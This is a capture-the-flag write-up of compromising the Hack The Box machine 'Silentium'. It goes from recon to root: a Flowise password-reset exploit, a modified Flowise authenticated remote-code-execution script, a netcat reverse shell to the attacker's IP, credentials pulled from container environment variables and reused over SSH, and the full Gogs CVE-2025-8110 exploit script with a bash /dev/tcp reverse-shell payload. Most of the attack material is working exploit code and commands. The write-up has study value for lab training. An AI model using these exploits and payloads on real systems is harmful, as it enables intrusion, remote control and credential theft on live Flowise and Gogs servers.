### Initial access
Nmap
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Silentium | Institutional Capital & Lending Solutions
|_http-favicon: Unknown favicon MD5: 033771DFEF9C64EFA01CAF726E3629A9
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

Subdomain scan
```bash
┌──(kali㉿kali)-[~/HTB/Silentium]
└─$ ffuf -u http://$target -H "Host: FUZZ.silentium.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 6

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.39.59
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.silentium.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6
________________________________________________

staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 126ms]
:: Progress: [4989/4989] :: Job [1/1] :: 459 req/sec :: Duration: [0:00:11] :: Errors: 0 ::

```

We see the page have FlowiseAI in title so we find the cve to that https://www.exploit-db.com/exploits/52557 

Let get access to the web we know e have user ben in main page
```bash
┌──(kali㉿kali)-[~/HTB/Silentium]
└─$ python3 exp.py --email ben@silentium.htb --newpassword Test@2025 --url http://staging.silentium.htb

_____       _                              _____ 
/  __ \     | |                            /  ___|
| /  \/ __ _| | __ _ _ __   __ _  ___  ___ \ `--. 
| |    / _` | |/ _` | '_ \ / _` |/ _ \/ __| `--. \
| \__/\ (_| | | (_| | | | | (_| | (_) \__ \/\__/ /
\____/\__,_|_|\__,_|_| |_|\__, |\___/|___/\____/ 
                            __/ |                 
                          |___/                  
                
                by nltt0

[x] Password changed

```

After have cred we found it also have rce when authenticated using https://www.exploit-db.com/exploits/52440
But i modify the exploit for me too work
```python3
from requests import post, session
from argparse import ArgumentParser

banner = r"""
_____       _                              _____ 
/  __ \     | |                            /  ___|
| /  \/ __ _| | __ _ _ __   __ _  ___  ___ \ `--. 
| |    / _` | |/ _` | '_ \ / _` |/ _ \/ __| `--. \
| \__/\ (_| | | (_| | | | | (_| | (_) \__ \/\__/ /
\____/\__,_|_|\__,_|_| |_|\__, |\___/|___/\____/ 
                            __/ |                 
                          |___/                  
                
                by nltt0
"""

try:
    parser = ArgumentParser(description='CVE-2025-59528 [Flowise < 3.0.5]',
        usage="python CVE-2025-58434.py --email xtz@local --password Test@2025 --url http://localhost:3000 --cmd \"http://localhost:1337/`whoami`\"")
    parser.add_argument('-e', '--email', required=True, help='Registered email')
    parser.add_argument('-p', '--password', required=True)
    parser.add_argument('-u', '--url', required=True)
    parser.add_argument('-c', '--cmd', required=True)

    args = parser.parse_args()
    email = args.email
    password = args.password
    url = args.url
    cmd = args.cmd

    def login(email, url):
        sess = session()   # <-- fixed
        url_format = f"{url}/api/v1/auth/login"
        headers = {
            "x-request-from": "internal",
            "Accept-Language": "pt-BR,pt;q=0.9",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
            "Origin": "http://workflow.flow.hc",
            "Referer": "http://workflow.flow.hc/signin",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        }
        data = {"email": email, "password": password}
        r = sess.post(url_format, headers=headers, json=data)
        return sess, r

    def rce(email, url, password, cmd):
        session, _ = login(email, url)  # unpack properly
        url_format = f"{url}/api/v1/node-load-method/customMCP"
        command = f'({{x:(function(){{const cp = process.mainModule.require("child_process");cp.execSync("{cmd}");return 1;}})()}})'

        data = {
            "loadMethod": "listActions",
            "inputs": {
                "mcpServerConfig": command
            }
        }

        r = session.post(url_format, json=data)

        if r.status_code == 401:
            session.headers["x-request-from"] = "internal"
            session.post(url_format, json=data)

        print(f"[x] Command executed [{cmd}]")

    rce(email, url, password, cmd)

except Exception as e:
    print(f'Error in {e}')

```

Get revshell
```bash
┌──(kali㉿kali)-[~/HTB/Silentium]
└─$ python3 exp.py --email ben@silentium.htb --password Test@2025 --url http://staging.silentium.htb --cmd 'nc 10.10.17.47 443 -e /bin/sh'

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Silentium]
└─$ penelope --oscp-safe --no-log -p 443
[+] Listening for reverse shells on 0.0.0.0:443 -> 127.0.0.1 • 192.168.122.216 • 10.10.17.47
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => c78c3cceb7ba 10.129.39.59 Linux-x86_64 👤 root(0) 😍 Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
/ # whoami
root
/ # 

```

Which is docker env we have to escape it
### Lateral Movement
Run linpeas
```bashh | {55}
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                                                                                                                         
                            ╚═════════════════════════╝                                                                                                                                                                                     
╔══════════╣ .sh files in path (T1574.007)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                                                                                                                                    
/usr/local/bin/docker-entrypoint.sh                                                                                                                                                                                                         
/usr/bin/spirv-lesspipe.sh
/usr/bin/gettext.sh

╔══════════╣ Executable files potentially added by user (limit 70) (T1083)
                                                                                                                                                                                                                                            
╔══════════╣ Unexpected in /opt (usually empty) (T1083)
total 12                                                                                                                                                                                                                                    
drwxr-xr-x    1 root     root          4096 Jul 16  2025 .
drwxr-xr-x    1 root     root          4096 Apr  8 15:14 ..
drwxr-xr-x    4 root     root          4096 Jul 16  2025 yarn-v1.22.22

╔══════════╣ Unexpected in root (T1083)
/.dockerenv                                                                                                                                                                                                                                 

╔══════════╣ Modified interesting files in the last 5mins (limit 100) (T1083)
/root/.ash_history                                                                                                                                                                                                                          
/root/.flowise/database.sqlite
/usr/local/lib/node_modules/flowise/logs/server-requests.log.jsonl
/usr/local/lib/node_modules/flowise/logs/server.log.2026-09-14-05


╔══════════╣ Checking all env variables in /proc/*/environ removing duplicates and filtering out useless env vars (T1552.007,T1082)
ALLOW_UNAUTHORIZED_CERTS=true                                                                                                                                                                                                               
DATABASE_PATH=/root/.flowise
FLOWISE_PASSWORD=F1l3_d0ck3r
FLOWISE_USERNAME=ben
HOME=/root
HOSTNAME=c78c3cceb7ba
JWT_AUDIENCE=AUDIENCE
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
JWT_ISSUER=ISSUER
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
JWT_TOKEN_EXPIRY_IN_MINUTES=360
LLM_PROVIDER=nvidia-nim
NODE_VERSION=20.19.4
NVIDIA_NIM_LLM_MODE=managed
PORT=3000
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
PWD=/
SECRETKEY_PATH=/root/.flowise
SENDER_EMAIL=ben@silentium.htb
SHELL=/bin/sh
SHLVL=1
SHLVL=2
SHLVL=3
SHLVL=4
SHLVL=5
SMTP_HOST=mailhog
SMTP_PASSWORD=r04D!!_R4ge
SMTP_PORT=1025
SMTP_SECURE=false
SMTP_USER=test
SMTP_USERNAME=test
TERM=xterm-256color
YARN_VERSION=1.22.22



```
We see password and test it on ben ssh and it work `ben:r04D!!_R4ge`
```bash
┌──(kali㉿kali)-[~/HTB/Silentium]
└─$ ssh ben@10.129.39.59                                                                                                   
The authenticity of host '10.129.39.59 (10.129.39.59)' can't be established.
ED25519 key fingerprint is SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:52: [hashed name]
    ~/.ssh/known_hosts:53: [hashed name]
    ~/.ssh/known_hosts:54: [hashed name]
    ~/.ssh/known_hosts:58: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.39.59' (ED25519) to the list of known hosts.
ben@10.129.39.59's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Sep 14 05:22:01 AM UTC 2026

  System load:           0.0
  Usage of /:            85.0% of 13.37GB
  Memory usage:          39%
  Swap usage:            0%
  Processes:             290
  Users logged in:       0
  IPv4 address for eth0: 10.129.39.59
  IPv6 address for eth0: dead:beef::250:56ff:feb9:ae8b

  => There are 60 zombie processes.

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

68 updates can be applied immediately.
52 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Wed Apr  8 19:12:55 2026 from 10.10.14.5
ben@silentium:~$ whoami
ben

```
### Priv escalation

Run pspy see weird binary
```
2026/09/14 05:34:36 CMD: UID=0    PID=1507   | /opt/gogs/gogs/gogs web 

```

And found that gogs is running local on port 3001 and we found that gogs have rce vuln which we can have shell with root. https://github.com/zAbuQasem/gogs-CVE-2025-8110.git
We change the exploit too hardcode to bypass capcha

```python
┌──(kali㉿kali)-[~/HTB/Silentium/gogs-CVE-2025-8110]
└─$ cat CVE-2025-8110.py
#!/usr/bin/env python3

import argparse
import requests
import os
import subprocess
import shutil
import urllib3
from urllib.parse import urlparse
import base64
from bs4 import BeautifulSoup
from rich.console import Console

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

"""Exploit script for CVE-2025-8110 in Gogs."""

__author__ = "zAbuQasem"
__Linkedin__ = "https://www.linkedin.com/in/zeyad-abulaban/"

proxies = {
    "http": "http://localhost:8080",
    "https": "http://localhost:8080",
}


def register(session, base_url, username, password):
    """Register a new user."""
    register_url = f"{base_url}/user/sign_up"
    resp = session.get(register_url)  # Get CSRF token from form

    csrf = extract_csrf(resp.text)

    register_data = {
        "_csrf": csrf,
        "user_name": username,
        "email": "zAbuQasem@attacker.com",
        "password": password,
        "retype": password,
    }
    resp = session.post(
        register_url,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=register_data,
        allow_redirects=True,
    )
    if "Username has already been taken." in resp.text:
        pass  # User already exists, continue
    elif "user/sign_up" in resp.url:
        console.print(f"[bold red]Registration failed: {resp.status_code}[/bold red]")
        raise ValueError("Registration failed")
    console.print("[bold green][+] Registered successfully[/bold green]")
    return session.cookies


def login(session, base_url, username, password):
    """Authenticate and retrieve CSRF token + session cookie."""
    login_url = f"{base_url}/user/login"
    resp = session.get(login_url)  # Get CSRF token from form

    csrf = extract_csrf(resp.text)

    login_data = {
        "_csrf": csrf,
        "user_name": username,
        "password": password,
    }
    resp = session.post(
        login_url,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=login_data,
        allow_redirects=True,
    )
    if "user/login" in resp.url:
        console.print(f"[bold red]Authentication failed: {resp.status_code}[/bold red]")
        raise ValueError("Authentication failed")
    console.print("[bold green][+] Authenticated successfully[/bold green]")
    return session.cookies


def get_application_token(session, base_url):
    """Retrieve application token from settings."""
    settings_url = f"{base_url}/user/settings/applications"
    # First GET to fetch the page (and CSRF hidden field) before POSTing
    get_resp = session.get(settings_url, allow_redirects=True)
    csrf = extract_csrf(get_resp.text)

    data = {"_csrf": csrf, "name": os.urandom(8).hex()}
    resp = session.post(settings_url, data=data, allow_redirects=True)
    console.print(f"[blue]Token generation status: {resp.status_code}[/blue]")
    soup = BeautifulSoup(resp.text, "html.parser")
    token_div = soup.find("div", class_="ui info message")
    if not token_div:
        raise ValueError("Application token not found")
    token = token_div.find("p").text.strip()
    console.print(f"[bold green][+] Application token: {token}[/bold green]")
    return token


def create_malicious_repo(session, base_url, token):
    """Create a repository with a malicious payload."""
    api = f"{base_url}/api/v1/user/repos"
    repository_name = os.urandom(6).hex()
    data = {
        "name": repository_name,
        "description": "Malicious repo for CVE-2025-8110",
        "auto_init": True,
        "readme": "Default",
        "ssh": True,
    }
    session.headers.update({"Authorization": f"token {token}"})
    resp = session.post(api, json=data)
    console.print(f"[blue]Repo creation status: {resp.status_code}[/blue]")
    return repository_name


def upload_malicious_symlink(base_url, username, password, repo_name):
    """Clone a repo, add a symlink, commit, and push it."""
    repo_dir = f"/tmp/{repo_name}"

    parsed_url = urlparse(base_url)
    if not parsed_url.scheme or not parsed_url.netloc:
        raise ValueError("Base URL must include scheme (e.g., http://host)")
    base_path = parsed_url.path.rstrip("/")

    clone_cmd = [
        "git",
        "clone",
        f"{parsed_url.scheme}://{username}:{password}@{parsed_url.netloc}"
        f"{base_path}/{username}/{repo_name}.git",
        repo_dir,
    ]

    symlink_path = os.path.join(repo_dir, "malicious_link")

    try:
        # Clean up if directory already exists
        if os.path.exists(repo_dir):
            shutil.rmtree(repo_dir)

        # Clone repository
        subprocess.run(clone_cmd, check=True)

        # Create symlink inside the repo
        os.symlink(".git/config", symlink_path)

        # Add, commit, and push
        subprocess.run(
            ["git", "add", "malicious_link"],
            cwd=repo_dir,
            check=True,
        )

        subprocess.run(
            ["git", "commit", "-m", "Add malicious symlink"],
            cwd=repo_dir,
            check=True,
        )

        subprocess.run(
            ["git", "push", "origin", "master"],
            cwd=repo_dir,
            check=True,
        )

    except subprocess.CalledProcessError as e:
        raise ValueError(f"Git command failed: {e}") from e
    except OSError as e:
        raise ValueError(f"Filesystem operation failed: {e}") from e


def exploit(session, base_url, token, username, repo_name, command):
    """Exploit CVE-2025-8110 to execute arbitrary commands."""
    api = f"{base_url}/api/v1/repos/{username}/{repo_name}/contents/malicious_link"
    data = {
        "message": "Exploit CVE-2025-8110",
        "content": base64.b64encode(command.encode()).decode(),
    }
    headers = {
        "Authorization": f"token {token}",
        "Content-Type": "application/json",
    }
    console.print("[bold green][+] Exploit sent, check your listener![/bold green]")
    session.put(api, json=data, headers=headers, timeout=5)


def extract_csrf(html_text):
    """Parse CSRF token from hidden input; fallback to cookie if present."""
    soup = BeautifulSoup(html_text, "html.parser")
    token_input = soup.select_one("input[name=_csrf]")
    if token_input and token_input.get("value"):
        return token_input.get("value")
    raise ValueError("CSRF token not found in form response")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="Gogs base URL")
    parser.add_argument("-lh", "--host", required=True, help="Attacker host")
    parser.add_argument("-lp", "--port", required=True, help="Attacker port")
    parser.add_argument("-x", "--proxy", action="store_true", help="Use proxy")
    args = parser.parse_args()
    session = requests.Session()
    if args.proxy:
        session.proxies.update(proxies)
    session.verify = False
    username = "test"
    password = "123"
    command = f"bash -c 'bash -i >& /dev/tcp/{args.host}/{args.port} 0>&1' #"
    try:
        #register(session, args.url, username, password)
        login(session, args.url, username, password)
        token = get_application_token(session, args.url)
        repo_name = create_malicious_repo(session, args.url, token)
        git_config = f"""[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
        ignorecase = true
        precomposeunicode = true
  sshCommand = {command}
[remote "origin"]
        url =  root@localhost:test/{repo_name}.git  # modify this add domain name to 127.0.0.1
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
        remote = origin
        merge = refs/heads/master
"""
        upload_malicious_symlink(args.url, username, password, repo_name)
        exploit(session, args.url, token, username, repo_name, git_config)

    except Exception as e:
        console.print(f"[bold red][-] Error: {e}[/bold red]")


if __name__ == "__main__":
    main()

```

```
┌──(kali㉿kali)-[~/HTB/Silentium/gogs-CVE-2025-8110]
└─$ git config --global user.name "test"
git config --global user.email "test@test.me"   
```
And we can get revser shell me must using ssh url for the command can execute